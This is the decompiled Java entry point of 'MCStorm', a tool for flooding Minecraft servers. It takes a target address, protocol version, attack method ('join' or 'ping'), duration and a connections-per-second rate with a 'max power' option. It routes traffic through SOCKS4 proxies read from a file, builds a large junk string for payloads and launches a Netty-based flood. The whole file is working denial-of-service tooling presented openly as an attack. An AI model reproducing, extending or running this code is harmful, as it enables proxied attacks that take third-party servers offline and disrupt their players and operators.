package IO.MCSTORM;

import IO.MCSTORM.methods.Method;
import IO.MCSTORM.utils.NettyBootstrap;
import IO.MCSTORM.utils.ProxyLoader;
import IO.MCSTORM.utils.ServerAddress;
import java.io.BufferedReader;
import java.io.File;
import java.net.InetAddress;
import java.util.Random;
import java.util.Scanner;
import net.dv8tion.jda.api.utils.MarkdownSanitizer;

/* loaded from: mcstorm.jar:IO/MCSTORM/Main.class */
public class Main {
    public static String origIP;
    public static String srvRecord;
    public static InetAddress resolved;
    public static int port;
    public static int protcolID;
    public static int protocolLength;
    public static String methodID;
    public static Method method;
    public static int duration;
    public static int targetCPS;
    public static int nettyThreads;
    public static int loopThreads;
    public static String string;
    public static File proxyFile;
    public static BufferedReader proxyScrape;
    public static ProxyLoader proxies;

    public static void main(String[] stringArray) throws Throwable {
        System.out.println("");
        System.out.println("");
        System.out.println("\n   ▄▄▄▄███▄▄▄▄    ▄████████    ▄████████     ███      ▄██████▄     ▄████████   ▄▄▄▄███▄▄▄▄   \n ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███ ▀█████████▄ ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄ \n ███   ███   ███ ███    █▀    ███    █▀     ▀███▀▀██ ███    ███   ███    ███ ███   ███   ███ \n ███   ███   ███ ███          ███            ███   ▀ ███    ███  ▄███▄▄▄▄██▀ ███   ███   ███ \n ███   ███   ███ ███        ▀███████████     ███     ███    ███ ▀▀███▀▀▀▀▀   ███   ███   ███ \n ███   ███   ███ ███    █▄           ███     ███     ███    ███ ▀███████████ ███   ███   ███ \n ███   ███   ███ ███    ███    ▄█    ███     ███     ███    ███   ███    ███ ███   ███   ███ \n  ▀█   ███   █▀  ████████▀   ▄████████▀     ▄████▀    ▀██████▀    ███    ███  ▀█   ███   █▀  \n                                                                  ███    ███                 \n                                                                                             \n                                                                                             \n                                                                                             \n▀█████████▄   ▄██████▄      ███         ███        ▄████████    ▄████████                    \n  ███    ███ ███    ███ ▀█████████▄ ▀█████████▄   ███    ███   ███    ███                    \n  ███    ███ ███    ███    ▀███▀▀██    ▀███▀▀██   ███    █▀    ███    ███                    \n ▄███▄▄▄██▀  ███    ███     ███   ▀     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀                    \n▀▀███▀▀▀██▄  ███    ███     ███         ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀                      \n  ███    ██▄ ███    ███     ███         ███       ███    █▄  ▀███████████                    \n  ███    ███ ███    ███     ███         ███       ███    ███   ███    ███                    \n▄█████████▀   ▀██████▀     ▄████▀      ▄████▀     ██████████   ███    ███                    \n                                                               ███    ███                    \n");
        System.out.println("");
        System.out.println("");
        if (stringArray.length != 5) {
            System.err.println("[ERROR] Correct usage: java -jar " + new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getName() + " <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>");
            System.err.println("");
            System.err.println("<IP:PORT>       - IP and port of the server             | Examples: 36.90.48.40:25577 or mc.myserver.com");
            System.err.println("<PROTOCOL>      - Protocol version of the server        | Examples: 47 or 340");
            System.err.println("<METHOD>        - Which method should be used to attack | Examples: join or ping");
            System.err.println("<SECONDS>       - How long should the attack last       | Examples: 60 or 300");
            System.err.println("<TARGETCPS>     - How many connections per second       | Examples: 1000 or 50000 (-1 for max power)");
            System.err.println("");
            System.err.println("Exit...");
            return;
        }
        System.out.println("Fetching proxies...");
        new Thread(() -> {
            String string2;
            Scanner scanner = new Scanner(System.in);
            do {
                string2 = scanner.next().toLowerCase();
                if (string2.equals("fs") || string2.equals("forcestop") || string2.equals("s") || string2.equals("stop") || string2.equals("fk")) {
                    break;
                }
            } while (!string2.equals("forcekill"));
            scanner.close();
            System.out.println("\u001b[0;31m Please wait few sec force shutting down....");
            System.exit(0);
        }).start();
        proxyFile = new File("proxies.txt");
        if (!proxyFile.exists()) {
            System.err.println("[ERROR] File proxies.txt not found");
            System.err.println("");
            System.err.println("File proxies.txt must contain list of Socks4 Proxies.");
            System.err.println("");
            System.err.println("Exit...");
            return;
        }
        proxies = new ProxyLoader(proxyFile);
        try {
            System.out.println("Resolving IP...");
            ServerAddress serverAddress = ServerAddress.getAddrss(stringArray[0]);
            srvRecord = serverAddress.getIP();
            port = serverAddress.getPort();
            resolved = InetAddress.getByName(srvRecord);
            System.out.println("Resolved IP: " + resolved.getHostAddress());
            origIP = stringArray[0].split(":")[0];
            protcolID = Integer.parseInt(stringArray[1]);
            methodID = stringArray[2];
            duration = Integer.parseInt(stringArray[3]);
            targetCPS = Integer.parseInt(stringArray[4]) + ((int) Math.ceil((Integer.parseInt(stringArray[4]) / 100) * (50 + (Integer.parseInt(stringArray[4]) / 5000))));
            nettyThreads = targetCPS == -1 ? MarkdownSanitizer.QUOTE : (int) Math.ceil(6.4E-4d * targetCPS);
            loopThreads = targetCPS == -1 ? 4 : (int) Math.ceil(1.999960000799984E-5d * targetCPS);
            protocolLength = protcolID > 128 ? 3 : 2;
            Random random = new Random();
            for (int i = 1; i < 65536; i++) {
                string = String.valueOf(string) + String.valueOf((char) (random.nextInt(125) + 1));
            }
            Methods.setupMethods();
            method = Methods.getMethod(methodID);
            NettyBootstrap.start();
        } catch (Exception exception) {
            exception.printStackTrace();
            Thread.sleep(100L);
        }
    }
}